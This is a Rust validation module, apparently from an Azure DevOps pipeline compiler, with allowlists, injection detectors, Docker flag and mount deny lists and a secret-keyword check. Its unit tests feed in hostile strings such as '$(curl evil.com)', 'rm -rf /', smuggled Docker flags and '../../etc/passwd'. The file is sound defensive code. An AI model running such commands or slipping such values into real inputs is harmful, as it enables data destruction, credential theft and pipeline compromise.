//! Centralized input validation primitives.
//!
//! This module is the single source of truth for structural input validators:
//! character allowlists, format validators, injection detectors, and
//! container/DNS validators.  It is shared across the compiler (front matter,
//! engine, MCP), Stage 3 execution, and tests.
//!
//! **Contrast with `sanitize.rs`:** that module transforms content
//! (remove ANSI codes, neutralize mentions, etc.) and returns a cleaned
//! `String`.  This module checks whether input is structurally valid and
//! returns `bool` or `Result`.
//!
//! **See also `secure.rs`:** for fields where invalidity should be
//! *unrepresentable*, prefer the validated newtypes in [`crate::secure`]
//! (e.g. `RelativeSafePath`, `CommitSha`) over a raw `String` validated by a
//! hand-written `validate()` method. Those newtypes run the primitives below
//! at deserialization time. New safe-output tools dealing with file paths or
//! identifiers should type their fields with `secure::` newtypes.

use anyhow::Result;
use std::collections::HashMap;
use std::path::{Path, PathBuf};

// ── Character allowlist validators ──────────────────────────────────────────

/// Validate that a string is safe to embed as a single path segment (e.g. a
/// repository alias appended to `$(Build.SourcesDirectory)`). Rejects empty
/// strings, anything containing `..`, path separators (`/`, `\`), or leading
/// `.` to prevent path traversal / hidden-directory escapes.
pub fn is_safe_path_segment(s: &str) -> bool {
    !s.is_empty()
        && !s.contains("..")
        && !s.contains('/')
        && !s.contains('\\')
        && !s.starts_with('.')
        && !s.contains('\n')
        && !s.contains('\r')
}

/// Characters allowed in engine.command paths (absolute path chars only).
/// Prevents shell injection when the path is embedded in AWF single-quoted commands.
pub fn is_valid_command_path(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-'))
}

/// Characters allowed in engine.agent and engine.model identifiers.
pub fn is_valid_identifier(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '-'))
}

/// Characters allowed in engine.api-target hostnames.
pub fn is_valid_hostname(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
}

/// Characters allowed in engine.version strings (e.g., "1.0.34", "latest").
pub fn is_valid_version(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Validate that a string is a valid ADO artifact name or attachment-type
/// segment: non-empty, composed of `[A-Za-z0-9._-]`.
///
/// The allowed charset is identical to [`is_valid_version`], but this function
/// exists as a separate entry point so that artifact-name validation is
/// decoupled from version-string validation. If version validation is ever
/// tightened (e.g. to require a leading digit), artifact names remain
/// unaffected.
pub fn is_valid_artifact_name(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Characters allowed in individual engine.args entries.
/// Strict allowlist to prevent shell injection inside AWF single-quoted commands.
pub fn is_valid_arg(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | ':' | '-' | '=' | '/' | '@'))
}

// ── Format validators ───────────────────────────────────────────────────────

/// Validate that a string is a valid ADO pipeline parameter name (`[A-Za-z_][A-Za-z0-9_]*`).
pub fn is_valid_parameter_name(name: &str) -> bool {
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Validate that a string is a legal environment variable name (`[A-Za-z_][A-Za-z0-9_]*`).
/// Prevents injection of arbitrary Docker flags via user-controlled front matter keys.
pub fn is_valid_env_var_name(name: &str) -> bool {
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Returns true if the name contains only ASCII alphanumerics and hyphens.
/// This value is embedded inline in a shell command, so control characters
/// (including newlines) and whitespace must be rejected to prevent corruption.
pub fn is_safe_tool_name(name: &str) -> bool {
    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
}

// ── Injection detectors ─────────────────────────────────────────────────────

/// Returns true if the string contains an ADO template expression (`${{`),
/// macro expression (`$(`), or runtime expression (`$[`).
pub fn contains_ado_expression(s: &str) -> bool {
    s.contains("${{") || s.contains("$(") || s.contains("$[")
}

/// Returns true if the string contains an ADO pipeline command
/// (`##vso[` or `##[`).
pub fn contains_pipeline_command(s: &str) -> bool {
    s.contains("##vso[") || s.contains("##[")
}

/// Returns true if the string contains a newline (`\n`) or carriage return (`\r`).
pub fn contains_newline(s: &str) -> bool {
    s.contains('\n') || s.contains('\r')
}

/// Returns true if the string contains the compiler's template marker
/// delimiter (`{{`).  Values substituted into the pipeline template must
/// not contain this sequence — otherwise a second-order substitution can
/// inject arbitrary content (e.g., `{{ agent_content }}` in the `name`
/// field would be expanded by a later replacement pass).
pub fn contains_template_marker(s: &str) -> bool {
    s.contains("{{")
}

/// Reject ADO template expressions (`${{`), macro expressions (`$(`), and runtime
/// expressions (`$[`) in a string value. Parameter definitions should only contain
/// literal values — expressions could enable information disclosure or logic manipulation
/// in the generated pipeline.
pub fn reject_ado_expressions(value: &str, param_name: &str, field_name: &str) -> Result<()> {
    if contains_ado_expression(value) {
        anyhow::bail!(
            "Parameter '{}' field '{}' contains an ADO expression ('${{{{', '$(', or '$[') which \
             is not allowed in parameter definitions. Use literal values only.",
            param_name,
            field_name,
        );
    }
    Ok(())
}

/// Reject ADO expressions in a serde_yaml::Value, recursing into strings within sequences.
pub fn reject_ado_expressions_in_value(
    value: &serde_yaml::Value,
    param_name: &str,
    field_name: &str,
) -> Result<()> {
    match value {
        serde_yaml::Value::String(s) => reject_ado_expressions(s, param_name, field_name),
        serde_yaml::Value::Sequence(seq) => {
            for item in seq {
                reject_ado_expressions_in_value(item, param_name, field_name)?;
            }
            Ok(())
        }
        // Booleans, numbers, null — safe, no injection risk
        _ => Ok(()),
    }
}

/// Reject values that could cause pipeline injection: ADO expressions,
/// pipeline commands (`##vso[`, `##[`), template markers (`{{`), and
/// newlines.  A combined check for fields embedded into YAML templates.
pub fn reject_pipeline_injection(value: &str, field_name: &str) -> Result<()> {
    if contains_ado_expression(value) {
        anyhow::bail!(
            "Front matter '{}' contains an ADO expression ('${{{{', '$(', or '$[') which is not allowed. \
             Use literal values only. Found: '{}'",
            field_name,
            value,
        );
    }
    if contains_pipeline_command(value) {
        anyhow::bail!(
            "Front matter '{}' contains an ADO pipeline command ('##vso[' or '##[') which is not allowed. \
             Pipeline commands could manipulate pipeline behavior. Found: '{}'",
            field_name,
            value,
        );
    }
    if contains_template_marker(value) {
        anyhow::bail!(
            "Front matter '{}' contains a template marker delimiter '{{{{' which is not allowed. \
             Template markers could cause second-order injection into the generated pipeline. Found: '{}'",
            field_name,
            value,
        );
    }
    if contains_newline(value) {
        anyhow::bail!(
            "Front matter '{}' must be a single line (no newlines). \
             Multi-line values could inject YAML structure into the generated pipeline.",
            field_name,
        );
    }
    Ok(())
}

// ── DNS / domain validators ─────────────────────────────────────────────────

/// Validate that a string is a valid DNS-safe domain name or wildcard pattern
/// (`*.example.com`).  Only ASCII alphanumerics, `.`, `-`, and `*` are allowed.
/// Wildcards must appear only as a leading `*.` prefix.
pub fn validate_dns_domain(host: &str) -> Result<()> {
    let valid_chars = !host.is_empty()
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '*'));
    if !valid_chars {
        anyhow::bail!(
            "network.allowed domain '{}' contains characters invalid in DNS names. \
             Only ASCII alphanumerics, '.', '-', and '*' are allowed.",
            host
        );
    }
    if host.contains('*') && (!host.starts_with("*.") || host[2..].contains('*')) {
        anyhow::bail!(
            "network.allowed domain '{}' uses '*' in an unsupported position. \
             Wildcards must appear only as a leading prefix (e.g. '*.example.com').",
            host
        );
    }
    Ok(())
}

// ── Container / Docker validators ───────────────────────────────────────────

/// Sensitive host path prefixes that should not be bind-mounted into MCP containers.
pub const SENSITIVE_MOUNT_PREFIXES: &[&str] = &[
    "/etc",
    "/root",
    "/home",
    "/proc",
    "/sys",
];

/// Docker runtime flag names that grant dangerous host access.
/// Checked both as `--flag=value` and as `--flag value` (split across two args).
pub const DANGEROUS_DOCKER_FLAGS: &[&str] = &[
    "--privileged",
    "--cap-add",
    "--security-opt",
    "--pid",
    "--network",
    "--ipc",
    "--user",
    "-u",
    "--add-host",
    "--entrypoint",
];

/// Validate a container image name for injection attempts.
/// Allows `[a-zA-Z0-9./_:-@]` which covers standard Docker image references.
pub fn validate_container_image(image: &str, mcp_name: &str) -> Vec<String> {
    let mut warnings = Vec::new();
    if image.is_empty() {
        warnings.push(format!("Warning: MCP '{}': container image name is empty.", mcp_name));
        return warnings;
    }
    if !image.chars().all(|c| c.is_ascii_alphanumeric() || "._/:-@".contains(c)) {
        warnings.push(format!(
            "Warning: MCP '{}': container image '{}' contains unexpected characters. \
            Image names should only contain [a-zA-Z0-9./_:-@].",
            mcp_name, image
        ));
    }
    warnings
}

/// Validate a volume mount source path, warning on sensitive host directories.
/// Docker socket mounts are escalated to stderr warnings since they grant container escape.
/// Note: paths are lowercased for comparison to catch cross-platform casing (e.g. `/ETC/shadow`).
pub fn validate_mount_source(mount: &str, mcp_name: &str) -> Vec<String> {
    let mut warnings = Vec::new();
    // Format: "source:dest:mode"
    if let Some(source) = mount.split(':').next() {
        let source_lower = source.to_lowercase();
        if source_lower.contains("docker.sock") {
            warnings.push(format!(
                "Warning: MCP '{}': mount '{}' exposes the Docker socket to the MCP container. \
                This grants full host Docker access and may allow container escape.",
                mcp_name, mount
            ));
            return warnings;
        }
        for prefix in SENSITIVE_MOUNT_PREFIXES {
            // Match exact path or path with trailing separator to avoid false positives
            // (e.g. /etc matches /etc and /etc/shadow, but not /etc-configs)
            if source_lower == *prefix || source_lower.starts_with(&format!("{}/", prefix)) {
                warnings.push(format!(
                    "Warning: MCP '{}': mount source '{}' references a sensitive host path ({}). \
                    Ensure this is intentional.",
                    mcp_name, source, prefix
                ));
                break;
            }
        }
    }
    warnings
}

/// Validate Docker runtime args for dangerous flags that could escalate privileges.
/// Also detects volume mounts smuggled via `-v`/`--volume` that bypass `mounts` validation.
/// Handles both `--flag=value` and `--flag value` (split) forms.
pub fn validate_docker_args(args: &[String], mcp_name: &str) -> Vec<String> {
    let mut warnings = Vec::new();
    for (i, arg) in args.iter().enumerate() {
        let arg_lower = arg.to_lowercase();
        // Check for dangerous Docker flags (both --flag=value and --flag value)
        for dangerous in DANGEROUS_DOCKER_FLAGS {
            if arg_lower == *dangerous
                || arg_lower.starts_with(&format!("{}=", dangerous))
            {
                let extra_hint = if *dangerous == "--entrypoint" {
                    " Use the 'entrypoint:' field instead of passing --entrypoint in args."
                } else {
                    ""
                };
                warnings.push(format!(
                    "Warning: MCP '{}': Docker arg '{}' grants elevated privileges. \
                    Ensure this is intentional.{}",
                    mcp_name, arg, extra_hint
                ));
            }
        }
        // Check for volume mounts smuggled via args (bypasses mounts validation)
        if arg == "-v" || arg == "--volume" {
            if let Some(mount_spec) = args.get(i + 1) {
                warnings.push(format!(
                    "Warning: MCP '{}': volume mount '{}' in args bypasses mounts validation. \
                    Use the 'mounts:' field instead.",
                    mcp_name, mount_spec
                ));
                warnings.extend(validate_mount_source(mount_spec, mcp_name));
            } else {
                warnings.push(format!(
                    "Warning: MCP '{}': '{}' flag is the last arg with no mount spec following it. \
                    This is likely a malformed args list.",
                    mcp_name, arg
                ));
            }
        } else if arg_lower.starts_with("-v=") || arg_lower.starts_with("--volume=") {
            let mount_spec = arg.split_once('=').map_or("", |(_, v)| v);
            warnings.push(format!(
                "Warning: MCP '{}': volume mount '{}' in args bypasses mounts validation. \
                Use the 'mounts:' field instead.",
                mcp_name, mount_spec
            ));
            warnings.extend(validate_mount_source(mount_spec, mcp_name));
        }
    }
    warnings
}

/// Validate that an MCP HTTP URL uses an allowed scheme.
pub fn validate_mcp_url(url: &str, mcp_name: &str) -> Vec<String> {
    let mut warnings = Vec::new();
    if !url.starts_with("https://") && !url.starts_with("http://") {
        warnings.push(format!(
            "Warning: MCP '{}': URL '{}' does not use http:// or https:// scheme. \
            This may not work with MCPG.",
            mcp_name, url
        ));
    }
    warnings
}

/// Warn when env values or headers look like they contain inline secrets.
/// Secrets should use pipeline variables and passthrough ("") instead.
pub fn warn_potential_secrets(mcp_name: &str, env: &HashMap<String, String>, headers: &HashMap<String, String>) -> Vec<String> {
    let mut warnings = Vec::new();
    for (key, value) in env {
        if !value.is_empty() && (key.to_lowercase().contains("token")
            || key.to_lowercase().contains("secret")
            || key.to_lowercase().contains("key")
            || key.to_lowercase().contains("password")
            || key.to_lowercase().contains("pat"))
        {
            warnings.push(format!(
                "Warning: MCP '{}': env var '{}' has an inline value that may be a secret. \
                Use an empty string (\"\") for passthrough from pipeline variables instead.",
                mcp_name, key
            ));
        }
    }
    for (key, value) in headers {
        if value.to_lowercase().contains("bearer ")
            || key.to_lowercase() == "authorization"
        {
            warnings.push(format!(
                "Warning: MCP '{}': header '{}' may contain inline credentials. \
                These will appear in plaintext in the compiled pipeline YAML.",
                mcp_name, key
            ));
        }
    }
    warnings
}

// ── Feed URL validation ─────────────────────────────────────────────────────

/// Validate a package feed URL for use in runtime `feed-url:` fields.
///
/// Checks for:
/// - ADO expression injection (`$(`, `${{`, `$[`)
/// - Pipeline command injection (`##vso[`, `##[`)
/// - Template marker injection (`{{`)
/// - Newline injection
/// - Quote characters (`"`, `'`) — would break YAML or bash quoting
/// - Missing scheme (must be `https://` or `http://`)
pub fn validate_feed_url(url: &str, field_name: &str) -> Result<()> {
    reject_pipeline_injection(url, field_name)?;

    if url.contains('"') || url.contains('\'') {
        anyhow::bail!(
            "Front matter '{}' contains a quote character which would produce \
             malformed YAML or bash syntax. Remove quotes from the URL. Found: '{}'",
            field_name,
            url,
        );
    }

    if !url.starts_with("https://") && !url.starts_with("http://") {
        anyhow::bail!(
            "Front matter '{}' must use https:// or http:// scheme. Found: '{}'",
            field_name,
            url,
        );
    }

    Ok(())
}

// ── Relative path safety ─────────────────────────────────────────────────────

/// Validate that `path` is a safe *relative* path for use inside a workspace.
///
/// This is the single canonical check for agent-supplied file paths. It rejects
/// the union of every variant that was previously re-implemented inline across
/// the safe-output tools and the MCP server:
///
/// - empty strings
/// - null bytes (`\0`)
/// - newlines / carriage returns (would split into multiple paths or inject)
/// - Azure DevOps pipeline commands (`##vso[`, `##[`)
/// - absolute paths (leading `/` or `\`)
/// - Windows drive prefixes (`C:\`, `D:/`, …)
/// - `..` path-traversal components (split on both `/` and `\`)
/// - any `.git` path component (case-insensitive) — blocks writes into the git
///   metadata directory, including `.git/hooks`
///
/// It intentionally does **not** reject leading-dot files in general (e.g.
/// `.gitignore`, `.github/workflows/ci.yml` are legitimate), nor colons outside
/// a drive prefix. For stricter single-segment identifiers use
/// [`validate_relative_segment_path`] or [`is_safe_path_segment`].
pub fn validate_relative_safe_path(path: &str, label: &str) -> Result<()> {
    if path.is_empty() {
        anyhow::bail!("{label} must not be empty");
    }
    if path.contains('\0') {
        anyhow::bail!("{label} must not contain null bytes");
    }
    if contains_newline(path) {
        anyhow::bail!("{label} must not contain newlines or carriage returns");
    }
    if contains_pipeline_command(path) {
        anyhow::bail!(
            "{label} must not contain Azure DevOps pipeline command sequences ('##vso[' or '##[')"
        );
    }
    if path.starts_with('/') || path.starts_with('\\') {
        anyhow::bail!("{label} must be a relative path (no leading '/' or '\\')");
    }
    // Windows drive prefix, e.g. `C:` at position 1.
    if path.len() >= 2 && path.as_bytes()[1] == b':' {
        anyhow::bail!("{label} must not be a Windows absolute path (drive letter)");
    }
    for component in path.split(['/', '\\']) {
        if component == ".." {
            anyhow::bail!("{label} must not contain '..' path-traversal components");
        }
        if component.eq_ignore_ascii_case(".git") {
            anyhow::bail!("{label} must not contain a '.git' path component");
        }
    }
    Ok(())
}

/// Validate that `path` is a safe relative path whose every component is also a
/// safe single path segment (see [`is_safe_path_segment`]): non-empty, no
/// leading `.`, no `..`. Additionally forbids `:` anywhere.
///
/// Use this for stricter contexts such as attachment / artifact staging paths
/// where hidden files and colons are never expected.
pub fn validate_relative_segment_path(path: &str, label: &str) -> Result<()> {
    validate_relative_safe_path(path, label)?;
    if path.contains(':') {
        anyhow::bail!("{label} must not contain ':'");
    }
    for component in path.split(['/', '\\']) {
        if !is_safe_path_segment(component) {
            anyhow::bail!(
                "{label} component '{component}' is not a safe path segment \
                 (no empty, '..', or leading '.' allowed)"
            );
        }
    }
    Ok(())
}

/// Canonicalize `candidate` and verify it resolves to a location inside `base`,
/// guarding against symlink / `..` escapes. `candidate` must already exist on
/// disk (canonicalization follows symlinks and fails on missing paths).
///
/// Returns the canonical form of `candidate` on success. `base` is canonicalized
/// internally so callers may pass the raw bounding directory.
pub fn ensure_path_within_base(candidate: &Path, base: &Path, label: &str) -> Result<PathBuf> {
    let canonical = candidate.canonicalize().map_err(|e| {
        anyhow::anyhow!(
            "{label} '{}' could not be located inside the workspace: {e}",
            candidate.display()
        )
    })?;
    let canonical_base = base
        .canonicalize()
        .map_err(|e| anyhow::anyhow!("Failed to canonicalize bounding directory: {e}"))?;
    if !canonical.starts_with(&canonical_base) {
        anyhow::bail!(
            "{label} '{}' resolves outside the permitted directory",
            candidate.display()
        );
    }
    Ok(canonical)
}

// ── Git reference / commit validators ────────────────────────────────────────

/// Return `true` if `s` is a full 40-character lowercase-or-uppercase hex SHA.
pub fn is_valid_commit_sha(s: &str) -> bool {
    s.len() == 40 && s.bytes().all(|b| b.is_ascii_hexdigit())
}

/// Validate that `s` is a full 40-character hex commit SHA.
pub fn validate_commit_sha(s: &str, label: &str) -> Result<()> {
    if s.len() != 40 {
        anyhow::bail!(
            "{label} must be exactly 40 hex characters, got {} characters",
            s.len()
        );
    }
    if !s.bytes().all(|b| b.is_ascii_hexdigit()) {
        anyhow::bail!("{label} must be a valid hex string: {s}");
    }
    Ok(())
}

/// Validate a string against `git check-ref-format` rules.
///
/// Returns `Ok(())` if the name is valid, or an `Err` describing the violation.
/// This covers the structural rules that Azure DevOps also enforces — catching
/// them early gives clearer error messages than letting the API fail.
pub fn validate_git_ref_name(name: &str, label: &str) -> Result<()> {
    use anyhow::ensure;

    ensure!(!name.is_empty(), "{label} must not be empty");
    ensure!(!name.contains(".."), "{label} must not contain '..'");
    ensure!(!name.contains("@{"), "{label} must not contain '@{{'");
    ensure!(!name.ends_with('.'), "{label} must not end with '.'");
    ensure!(!name.ends_with(".lock"), "{label} must not end with '.lock'");
    ensure!(!name.contains('\\'), "{label} must not contain backslash");
    ensure!(
        !name.contains("//"),
        "{label} must not contain consecutive slashes"
    );
    for ch in ['~', '^', ':', '?', '*', '['] {
        ensure!(!name.contains(ch), "{label} must not contain '{ch}'");
    }
    for component in name.split('/') {
        ensure!(
            !component.starts_with('.'),
            "{label} path component must not start with '.'"
        );
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Character allowlist validators ──────────────────────────────────

    #[test]
    fn test_is_safe_path_segment() {
        assert!(is_safe_path_segment("my-repo"));
        assert!(is_safe_path_segment("exp23-a7-nw"));
        assert!(is_safe_path_segment("repo_v2"));
        assert!(!is_safe_path_segment(""));
        assert!(!is_safe_path_segment(".."));
        assert!(!is_safe_path_segment("../sibling"));
        assert!(!is_safe_path_segment("foo/bar"));
        assert!(!is_safe_path_segment("foo\\bar"));
        assert!(!is_safe_path_segment(".hidden"));
        assert!(!is_safe_path_segment("foo..bar"));
        assert!(!is_safe_path_segment("foo\nbar"));
        assert!(!is_safe_path_segment("foo\rbar"));
    }

    #[test]
    fn test_is_valid_command_path() {
        assert!(is_valid_command_path("/tmp/awf-tools/copilot"));
        assert!(is_valid_command_path("copilot"));
        assert!(is_valid_command_path("/usr/local/bin/my-tool_v2"));
        assert!(!is_valid_command_path(""));
        assert!(!is_valid_command_path("/tmp/copilot; rm -rf /"));
        assert!(!is_valid_command_path("/tmp/copilot'"));
        assert!(!is_valid_command_path("path with spaces"));
    }

    #[test]
    fn test_is_valid_identifier() {
        assert!(is_valid_identifier("claude-opus-4.5"));
        assert!(is_valid_identifier("gpt-5.2-codex"));
        assert!(is_valid_identifier("my-agent"));
        assert!(is_valid_identifier("model:variant"));
        assert!(!is_valid_identifier(""));
        assert!(!is_valid_identifier("bad agent!"));
        assert!(!is_valid_identifier("model with spaces"));
    }

    #[test]
    fn test_is_valid_hostname() {
        assert!(is_valid_hostname("api.github.com"));
        assert!(is_valid_hostname("api.acme-ghe.com"));
        assert!(is_valid_hostname("localhost"));
        assert!(!is_valid_hostname(""));
        assert!(!is_valid_hostname("host/path"));
        assert!(!is_valid_hostname("host:443"));
    }

    #[test]
    fn test_is_valid_version() {
        assert!(is_valid_version("1.0.34"));
        assert!(is_valid_version("latest"));
        assert!(is_valid_version("1.0.0-beta"));
        assert!(is_valid_version("1.0.0_rc1"));
        assert!(!is_valid_version(""));
        assert!(!is_valid_version("1.0.0 -Source https://evil.com"));
    }

    #[test]
    fn test_is_valid_artifact_name() {
        assert!(is_valid_artifact_name("my-artifact_v1.0"));
        assert!(is_valid_artifact_name("drop"));
        assert!(!is_valid_artifact_name(""));
        assert!(!is_valid_artifact_name("my artifact"));
        assert!(!is_valid_artifact_name("$(secretVar)"));
        assert!(!is_valid_artifact_name("../../etc/passwd"));
        assert!(!is_valid_artifact_name("{{inject}}"));
    }

    #[test]
    fn test_is_valid_arg() {
        assert!(is_valid_arg("--verbose"));
        assert!(is_valid_arg("--option=value"));
        assert!(is_valid_arg("--path=/dir/file"));
        assert!(is_valid_arg("--email=user@domain"));
        assert!(!is_valid_arg(""));
        assert!(!is_valid_arg("--flag; rm -rf /"));
        assert!(!is_valid_arg("arg with spaces"));
    }

    // ── Format validators ───────────────────────────────────────────────

    #[test]
    fn test_is_valid_parameter_name() {
        assert!(is_valid_parameter_name("clearMemory"));
        assert!(is_valid_parameter_name("_private"));
        assert!(is_valid_parameter_name("param123"));
        assert!(!is_valid_parameter_name(""));
        assert!(!is_valid_parameter_name("123abc"));
        assert!(!is_valid_parameter_name("my-param"));
        assert!(!is_valid_parameter_name("my param"));
    }

    #[test]
    fn test_is_valid_env_var_name() {
        assert!(is_valid_env_var_name("MY_VAR"));
        assert!(is_valid_env_var_name("_PRIVATE"));
        assert!(is_valid_env_var_name("A"));
        assert!(is_valid_env_var_name("VAR123"));
        assert!(!is_valid_env_var_name(""));
        assert!(!is_valid_env_var_name("123ABC"));
        assert!(!is_valid_env_var_name("MY-VAR"));
        assert!(!is_valid_env_var_name("MY VAR"));
        assert!(!is_valid_env_var_name("X --privileged"));
        assert!(!is_valid_env_var_name("X -v /etc:/etc:rw"));
    }

    #[test]
    fn test_is_safe_tool_name() {
        assert!(is_safe_tool_name("create-pull-request"));
        assert!(is_safe_tool_name("noop"));
        assert!(is_safe_tool_name("my-tool-123"));
        assert!(!is_safe_tool_name(""));
        assert!(!is_safe_tool_name("$(curl evil.com)"));
        assert!(!is_safe_tool_name("foo; rm -rf /"));
        assert!(!is_safe_tool_name("tool name"));
        assert!(!is_safe_tool_name("tool\ttab"));
    }

    // ── Injection detectors ─────────────────────────────────────────────

    #[test]
    fn test_contains_ado_expression() {
        assert!(contains_ado_expression("${{ variables.x }}"));
        assert!(contains_ado_expression("$(SYSTEM_ACCESSTOKEN)"));
        assert!(contains_ado_expression("$[variables.x]"));
        assert!(!contains_ado_expression("normal text"));
        assert!(!contains_ado_expression("$100"));
    }

    #[test]
    fn test_contains_pipeline_command() {
        assert!(contains_pipeline_command("##vso[task.setvariable]x"));
        assert!(contains_pipeline_command("##[section]foo"));
        assert!(!contains_pipeline_command("normal text"));
        assert!(!contains_pipeline_command("## heading"));
    }

    #[test]
    fn test_contains_newline() {
        assert!(contains_newline("line1\nline2"));
        assert!(contains_newline("line1\rline2"));
        assert!(!contains_newline("single line"));
    }

    #[test]
    fn test_contains_template_marker() {
        assert!(contains_template_marker("{{ agent_content }}"));
        assert!(contains_template_marker("prefix {{ something }} suffix"));
        assert!(contains_template_marker("{{no_spaces}}"));
        assert!(!contains_template_marker("normal text"));
        assert!(!contains_template_marker("just a single { brace"));
    }

    #[test]
    fn test_reject_ado_expressions() {
        assert!(reject_ado_expressions("normal value", "param", "field").is_ok());
        assert!(reject_ado_expressions("$(SYSTEM_ACCESSTOKEN)", "param", "field").is_err());
        assert!(reject_ado_expressions("${{ variables.x }}", "param", "field").is_err());
        assert!(reject_ado_expressions("$[variables.x]", "param", "field").is_err());
    }

    #[test]
    fn test_reject_ado_expressions_in_value_catches_injection_in_sequence() {
        let seq = serde_yaml::Value::Sequence(vec![
            serde_yaml::Value::String("safe".to_string()),
            serde_yaml::Value::String("$(secretVar)".to_string()),
        ]);
        let result = reject_ado_expressions_in_value(&seq, "myParam", "default");
        assert!(result.is_err(), "Sequence with ADO expression must be rejected");
    }

    #[test]
    fn test_reject_ado_expressions_in_value_allows_safe_sequence() {
        let seq = serde_yaml::Value::Sequence(vec![
            serde_yaml::Value::String("us-east".to_string()),
            serde_yaml::Value::String("eu-west".to_string()),
        ]);
        assert!(reject_ado_expressions_in_value(&seq, "region", "default").is_ok());
    }

    #[test]
    fn test_reject_pipeline_injection() {
        assert!(reject_pipeline_injection("normal value", "field").is_ok());
        assert!(reject_pipeline_injection("$(SYSTEM_ACCESSTOKEN)", "field").is_err());
        assert!(reject_pipeline_injection("value\ninjected", "field").is_err());
        assert!(reject_pipeline_injection("{{ agent_content }}", "field").is_err());
        assert!(reject_pipeline_injection("$[variables.x]", "field").is_err());
        assert!(reject_pipeline_injection("##vso[task.setvariable]x", "field").is_err());
        assert!(reject_pipeline_injection("##[section]foo", "field").is_err());
    }

    // ── DNS domain validators ───────────────────────────────────────────

    #[test]
    fn test_validate_dns_domain() {
        assert!(validate_dns_domain("github.com").is_ok());
        assert!(validate_dns_domain("*.example.com").is_ok());
        assert!(validate_dns_domain("api.acme-corp.com").is_ok());
        assert!(validate_dns_domain("").is_err());
        assert!(validate_dns_domain("host/path").is_err());
        assert!(validate_dns_domain("host with spaces").is_err());
        assert!(validate_dns_domain("*evil*").is_err());
        assert!(validate_dns_domain("foo.*.com").is_err());
    }

    // ── Container / Docker validators ───────────────────────────────────

    #[test]
    fn test_warn_potential_secrets() {
        let env = HashMap::from([("AZURE_DEVOPS_EXT_PAT".to_string(), "secret123".to_string())]);
        let warnings = warn_potential_secrets("mcp", &env, &HashMap::new());
        assert!(!warnings.is_empty());
        assert!(warnings[0].contains("secret"));

        let empty_env = HashMap::from([("AZURE_DEVOPS_EXT_PAT".to_string(), String::new())]);
        let warnings = warn_potential_secrets("mcp", &empty_env, &HashMap::new());
        assert!(warnings.is_empty());
    }

    // ── Feed URL validation ────────────────────────────────────────────

    #[test]
    fn test_validate_feed_url_valid() {
        assert!(validate_feed_url("https://pkgs.dev.azure.com/org/_packaging/feed/pypi/simple/", "test").is_ok());
        assert!(validate_feed_url("http://internal.registry.example.com/", "test").is_ok());
    }

    #[test]
    fn test_validate_feed_url_unsupported_scheme() {
        assert!(validate_feed_url("pkgs.dev.azure.com/org/feed", "test").is_err());
        assert!(validate_feed_url("ftp://example.com/feed", "test").is_err());
    }

    #[test]
    fn test_validate_feed_url_injection() {
        assert!(validate_feed_url("https://example.com/$(SECRET)", "test").is_err());
        assert!(validate_feed_url("https://example.com/##vso[task.setvariable]", "test").is_err());
        assert!(validate_feed_url("https://example.com/{{ marker }}", "test").is_err());
        assert!(validate_feed_url("https://example.com/\ninjected", "test").is_err());
    }

    #[test]
    fn test_validate_feed_url_rejects_quotes() {
        assert!(validate_feed_url("https://example.com/feed\"name", "test").is_err());
        assert!(validate_feed_url("https://example.com/feed'name", "test").is_err());
    }

    // ── Relative path safety ───────────────────────────────────────────

    #[test]
    fn test_validate_relative_safe_path_accepts_legit() {
        assert!(validate_relative_safe_path("src/main.rs", "p").is_ok());
        assert!(validate_relative_safe_path(".gitignore", "p").is_ok());
        assert!(validate_relative_safe_path(".github/workflows/ci.yml", "p").is_ok());
        assert!(validate_relative_safe_path("a/b/c.txt", "p").is_ok());
    }

    #[test]
    fn test_validate_relative_safe_path_rejects_dangerous() {
        assert!(validate_relative_safe_path("", "p").is_err());
        assert!(validate_relative_safe_path("/etc/passwd", "p").is_err());
        assert!(validate_relative_safe_path("\\windows\\system32", "p").is_err());
        assert!(validate_relative_safe_path("C:\\Users", "p").is_err());
        assert!(validate_relative_safe_path("../secret", "p").is_err());
        assert!(validate_relative_safe_path("a/../b", "p").is_err());
        assert!(validate_relative_safe_path("a\\..\\b", "p").is_err());
        assert!(validate_relative_safe_path(".git/config", "p").is_err());
        assert!(validate_relative_safe_path("sub/.git/hooks/pre-commit", "p").is_err());
        assert!(validate_relative_safe_path("sub/.GIT/config", "p").is_err());
        assert!(validate_relative_safe_path("a\0b", "p").is_err());
        assert!(validate_relative_safe_path("a\nb", "p").is_err());
        assert!(validate_relative_safe_path("a/##vso[task]", "p").is_err());
    }

    #[test]
    fn test_validate_relative_segment_path_is_stricter() {
        assert!(validate_relative_segment_path("src/main.rs", "p").is_ok());
        // leading-dot files are rejected here (allowed by the base variant)
        assert!(validate_relative_safe_path(".gitignore", "p").is_ok());
        assert!(validate_relative_segment_path(".gitignore", "p").is_err());
        assert!(validate_relative_segment_path("a/.hidden/b", "p").is_err());
        assert!(validate_relative_segment_path("a:b", "p").is_err());
        // Consecutive slashes yield an empty component, rejected by the strict
        // variant (each component must pass `is_safe_path_segment`).
        assert!(validate_relative_segment_path("a//b", "p").is_err());
        // The base variant tolerates empty components (`is_safe_path_segment`
        // is not applied per-component there), so `a//b` is accepted by it.
        assert!(validate_relative_safe_path("a//b", "p").is_ok());
    }

    #[test]
